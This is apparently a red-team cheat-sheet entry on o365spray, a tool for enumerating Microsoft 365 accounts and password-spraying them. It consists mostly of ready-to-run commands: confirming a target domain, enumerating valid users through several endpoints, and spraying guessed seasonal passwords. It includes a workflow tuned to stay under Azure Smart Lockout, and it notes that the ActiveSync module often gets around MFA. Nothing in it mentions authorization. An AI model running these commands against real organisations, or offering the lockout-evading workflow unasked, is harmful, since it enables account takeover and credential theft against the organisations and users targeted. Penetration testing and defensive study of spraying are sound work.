# o365spray

**Tags:** `#o365spray` `#microsoft365` `#userenumeration` `#passwordspray` `#cloud` `#auth` `#external`

Python tool for Microsoft 365 user enumeration and password spraying. Tests multiple enumeration methods and spray vectors specific to M365/Entra ID authentication endpoints. Purpose-built for external M365 engagements where Hydra/Medusa are too generic and Kerbrute (AD Kerberos) doesn't apply.

**Source:** https://github.com/0xZDH/o365spray
**Install:**
```bash
git clone https://github.com/0xZDH/o365spray
pip install -r requirements.txt
```

> [!note] **o365spray vs Kerbrute** — Kerbrute attacks AD Kerberos pre-auth (requires network access to DC). o365spray attacks Microsoft's online authentication endpoints — use it for external engagements targeting organizations using M365 without VPN/network access.

---

## Validate Domain

First confirm the target domain uses Microsoft 365.

```bash
# Check if domain is on M365
python3 o365spray.py --validate --domain company.com

# Returns: whether the domain is M365-hosted and auth type (Managed/Federated)
```

---

## User Enumeration

Identify valid accounts before spraying — avoids wasting spray attempts on non-existent users and reduces lockout risk.

```bash
# Enumerate from a username list
python3 o365spray.py --enum -U usernames.txt --domain company.com

# Single user check
python3 o365spray.py --enum -u jsmith@company.com --domain company.com

# Specify enumeration module (default: office)
python3 o365spray.py --enum -U usernames.txt --domain company.com --module office
python3 o365spray.py --enum -U usernames.txt --domain company.com --module activesync
python3 o365spray.py --enum -U usernames.txt --domain company.com --module oauth2

# Save valid users to file
python3 o365spray.py --enum -U usernames.txt --domain company.com -o valid_users.txt

# List available enumeration modules
python3 o365spray.py --enum --list-modules
```

---

## Password Spraying

```bash
# Spray a single password against a user list
python3 o365spray.py --spray -U valid_users.txt -p 'Spring2024!' --domain company.com

# Single user
python3 o365spray.py --spray -u jsmith@company.com -p 'Spring2024!' --domain company.com

# Spray with a password list (careful — lockout risk)
python3 o365spray.py --spray -U valid_users.txt -P passwords.txt --domain company.com

# Specify spray module
python3 o365spray.py --spray -U users.txt -p 'Pass' --domain company.com --module oauth2
python3 o365spray.py --spray -U users.txt -p 'Pass' --domain company.com --module activesync

# Set delay between attempts (seconds) — reduce lockout risk
python3 o365spray.py --spray -U users.txt -p 'Pass' --domain company.com --sleep 30

# Set number of threads
python3 o365spray.py --spray -U users.txt -p 'Pass' --domain company.com --threads 5

# Save hits
python3 o365spray.py --spray -U users.txt -p 'Pass' --domain company.com -o hits.txt

# List spray modules
python3 o365spray.py --spray --list-modules
```

---

## Available Modules

| Module | Type | Notes |
|---|---|---|
| `office` | Enum | Microsoft Office endpoint — most reliable enum method |
| `activesync` | Enum + Spray | Exchange ActiveSync — often bypasses MFA/CA |
| `oauth2` | Enum + Spray | Microsoft OAuth2 token endpoint |
| `autodiscover` | Enum | Exchange Autodiscover |
| `reporting` | Enum | Microsoft reporting endpoint |
| `onedrive` | Enum | OneDrive endpoint |
| `rst` | Enum | Microsoft RST endpoint |
| `adfs` | Spray | ADFS endpoint for federated tenants |

---

## Safe Spray Workflow

```bash
# 1. Validate domain is on M365
python3 o365spray.py --validate --domain company.com

# 2. Generate username candidates with Username Anarchy
./username-anarchy -i names.txt -f first.last > candidates.txt

# 3. Enumerate valid users (no password attempts)
python3 o365spray.py --enum -U candidates.txt --domain company.com -o valid_users.txt

# 4. Check lockout policy via tenant recon (AADInternals or manual)
# Smart Lockout default: 10 attempts → 60 second lockout, resets per 60s

# 5. Spray once per round (1 password per account per session)
python3 o365spray.py --spray -U valid_users.txt -p 'Spring2024!' \
  --domain company.com --sleep 60 --threads 3 -o results.txt

# 6. Wait 60+ minutes before next spray round
python3 o365spray.py --spray -U valid_users.txt -p 'Summer2024!' \
  --domain company.com --sleep 60 --threads 3 -o results.txt
```

> [!warning] **Smart Lockout** — Azure AD Smart Lockout tracks failed attempts per account. Default threshold is ~10 attempts before a 60-second lockout. Keep threads low, use `--sleep`, and spray 1 password per round with 60+ minute gaps between rounds.

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
